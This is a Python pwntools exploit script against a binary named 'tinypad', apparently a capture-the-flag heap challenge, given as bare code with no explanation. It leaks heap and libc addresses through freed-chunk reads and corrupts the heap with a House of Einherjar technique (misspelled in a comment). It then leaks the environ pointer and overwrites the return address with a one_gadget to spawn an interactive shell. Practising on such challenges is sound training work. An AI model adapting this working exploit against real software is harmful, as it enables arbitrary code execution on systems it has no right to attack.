from pwn import *

p = process('./tinypad')
elf = ELF('./tinypad')
libc = ELF('libc.so')
context.log_level = 'debug'

def create(size,content) :
    p.sendlineafter('(CMD)>>> ','a')
    p.sendlineafter('(SIZE)>>> ',str(size))
    p.sendlineafter('(CONTENT)>>> ',content)

def delete(index) :
    p.sendlineafter('(CMD)>>> ','d')
    p.sendlineafter('(INDEX)>>> ',str(index))

def edit(index,content) :
    p.sendlineafter('(CMD)>>> ','e')
    p.sendlineafter('(INDEX)>>> ',str(index))
    p.sendlineafter('(CONTENT)>>> ',content)
    p.sendlineafter('(Y/n)>>> ','Y')

create(0x40,'AAAAAAAA')
create(0x40,'AAAAAAAA')
create(0x80,'AAAAAAAA')

#leak --> libc --> heap
delete(2)
delete(1)

p.recvuntil('#   INDEX: 1\n')
p.recvuntil(' # CONTENT: ')
data = u64(p.recv(4).ljust(8,'\x00'))
heap_base = data - 0x50
log.success('heap_addr :'+hex(heap_base))

delete(3)

p.recvuntil('#   INDEX: 1\n')
p.recvuntil(' # CONTENT: ')
data2 = u64(p.recv(6).ljust(8,'\x00'))
log.success('leak_addr :'+hex(data2))
libc_base = data2 - 0x3c4b78
one_gadget = libc_base + 0x45216
environ_addr = libc_base + libc.symbols['environ']
log.success('environ_addr :'+hex(environ_addr))
log.success('one_gadget_addr :'+hex(one_gadget))

#house of engerinc
create(0x18,'A'*0x18)
create(0x100,'A'*0xf8 + '\x11')
create(0x100,'A'*0xf8)
create(0x100,'A'*0xf8)

payload = 'A'*0x20 + p64(0x0) + p64(0x21) + p64(0x602040 + 0x20)
payload += p64(0x602040 + 0x20) + p64(0x20)
edit(3,payload)

offset = heap_base - 0x602040
offset_strip = p64(offset).strip('\x00')
num_size = len(p64(offset)) - len(offset_strip)
print num_size

for i in range(num_size+1) :
    edit(1,offset_strip.rjust(0x18 - i,'A'))
delete(2)

edit(4,'A'*0x20+p64(0x0)+p64(0x111)+p64(data2)+p64(data2))
create(0x100,'A'*0xd0+p64(0x18)+p64(environ_addr)+p64(0x100)+p64(0x602148))

#leak --> environ_addr
p.recvuntil('#   INDEX: 1\n')
p.recvuntil(' # CONTENT: ')
data3 = u64(p.recv(6).ljust(8,'\x00'))
log.success('environ_addr :'+hex(data3))

ret_addr = data3 - 0xf0
edit(2,p64(ret_addr))
edit(1,p64(one_gadget))

p.interactive()
